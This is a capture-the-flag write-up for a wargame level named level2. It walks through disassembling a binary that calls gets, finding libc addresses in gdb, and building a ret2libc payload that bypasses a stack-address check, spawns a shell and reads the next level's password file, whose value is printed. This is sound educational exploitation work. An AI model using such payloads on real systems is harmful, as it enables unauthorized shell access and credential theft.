# Level2

We can see that we have an executable file, which waits for input when launched, and which repeats what we have entered.

```
$ ls
level2
$ ./level2
test
test
```

When we look at the program's code, we see that it does nothing except call the ``p`` function.

```
$ objdump -M intel -d ./level2

0804853f <main>:
 804853f:       55                      push   ebp
 8048540:       89 e5                   mov    ebp,esp
 8048542:       83 e4 f0                and    esp,0xfffffff0
 8048545:       e8 8a ff ff ff          call   80484d4 <p>
 804854a:       c9                      leave
 804854b:       c3                      ret
 804854c:       90                      nop
 804854d:       90                      nop
 804854e:       90                      nop
 804854f:       90                      nop
```

We can see that ``p`` uses ``gets``, which surely allows for a ``buffer overflow attack``.

```
$ objdump -M intel -d ./level2

080484d4 <p>:
 80484d4:       55                      push   ebp
 80484d5:       89 e5                   mov    ebp,esp
 80484d7:       83 ec 68                sub    esp,0x68
 80484da:       a1 60 98 04 08          mov    eax,ds:0x8049860
 80484df:       89 04 24                mov    DWORD PTR [esp],eax
 80484e2:       e8 c9 fe ff ff          call   80483b0 <fflush@plt>
 80484e7:       8d 45 b4                lea    eax,[ebp-0x4c]
 80484ea:       89 04 24                mov    DWORD PTR [esp],eax
 80484ed:       e8 ce fe ff ff          call   80483c0 <gets@plt>
 80484f2:       8b 45 04                mov    eax,DWORD PTR [ebp+0x4]
 80484f5:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax
 80484f8:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
 80484fb:       25 00 00 00 b0          and    eax,0xb0000000
 8048500:       3d 00 00 00 b0          cmp    eax,0xb0000000
 8048505:       75 20                   jne    8048527 <p+0x53>
 8048507:       b8 20 86 04 08          mov    eax,0x8048620
 804850c:       8b 55 f4                mov    edx,DWORD PTR [ebp-0xc]
 804850f:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 8048513:       89 04 24                mov    DWORD PTR [esp],eax
 8048516:       e8 85 fe ff ff          call   80483a0 <printf@plt>
 804851b:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 8048522:       e8 a9 fe ff ff          call   80483d0 <_exit@plt>
 8048527:       8d 45 b4                lea    eax,[ebp-0x4c]
 804852a:       89 04 24                mov    DWORD PTR [esp],eax
 804852d:       e8 be fe ff ff          call   80483f0 <puts@plt>
 8048532:       8d 45 b4                lea    eax,[ebp-0x4c]
 8048535:       89 04 24                mov    DWORD PTR [esp],eax
 8048538:       e8 a3 fe ff ff          call   80483e0 <strdup@plt>
 804853d:       c9                      leave
 804853e:       c3                      ret
```

The value of gets is stored ``76 bytes`` before ``EBP`` (0x4c = 76), so ``80 bytes`` before ``EIP``, so we can surely overflow into ``EIP`` and do a ``Ret2Libc``.
</br>
https://en.wikipedia.org/wiki/Return-to-libc_attack

```
 80484e7:       8d 45 b4                lea    eax,[ebp-0x4c]
```

You can also see a protection measure, which can be bypassed by entering the address of the ``ret`` of the ``main``, to go to the end of the program when it attempts to make the comparison.

```
 80484fb:       25 00 00 00 b0          and    eax,0xb0000000
 8048500:       3d 00 00 00 b0          cmp    eax,0xb0000000
```

main return address: ``0x0804854b``.

```
$ objdump -M intel -d ./level2

0804853f <main>:
 804853f:       55                      push   ebp
 8048540:       89 e5                   mov    ebp,esp
 8048542:       83 e4 f0                and    esp,0xfffffff0
 8048545:       e8 8a ff ff ff          call   80484d4 <p>
 804854a:       c9                      leave
 804854b:       c3                      ret
 804854c:       90                      nop
 804854d:       90                      nop
 804854e:       90                      nop
 804854f:       90                      nop
```

We also need the address of the ``system`` function, ``/bin/sh``, which is always stored somewhere during C compilation, and, for greater clarity, the address of the ``exit`` function.

```
$ gdb ./level2
(gdb) break p
Breakpoint 1 at 0x80484da
(gdb) run
Starting program: /home/user/level2/level2

Breakpoint 1, 0x080484da in p ()
(gdb) info proc mappings
process 3588
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
         0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
        0xb7e2b000 0xb7e2c000     0x1000        0x0
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0
        0xb7fdb000 0xb7fdd000     0x2000        0x0
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000, 0xb7fdb000, "/bin/sh"
0xb7f8cc58
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) print exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```

which gives us, with the address translated into ``little‑endian`` and prepared for ``Python``:
</br></br>
main ``return`` address: ``0x0804854b``, who gives ``\x4b\x85\x04\x08``.
</br>
``system`` function address: ``0xb7e6b060``, who gives ``\x60\xb0\xe6\xb7``.
</br>
``exit`` function address: ``0xb7e5ebe0``, who gives ``\xe0\xeb\xe5\xb7``.
</br>
``/bin/sh``: ``0xb7f8cc58``, who gives ``\x58\xcc\xf8\xb7``.

```
$ (python -c 'print("0"*80+"\x4b\x85\x04\x08"+"\x60\xb0\xe6\xb7"+"\xe0\xeb\xe5\xb7"+"\x58\xcc\xf8\xb7")'; cat) | ./level2
0000000000000000000000000000000000000000000000000000000000000000K000000000000K`�����X���
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

``cat`` keeps the shell open.

Step 1: Fill the buffer.
</br>
Step 2: Pass the protection, entering the return address of the main
</br>
Step 3: Call system with /bin/sh

Bonus: using the ``exit`` function, we could do without it by entering "AAAA" for example, but thanks to exit, it avoids segfault and allows us to keep the shell open even after entering a command.
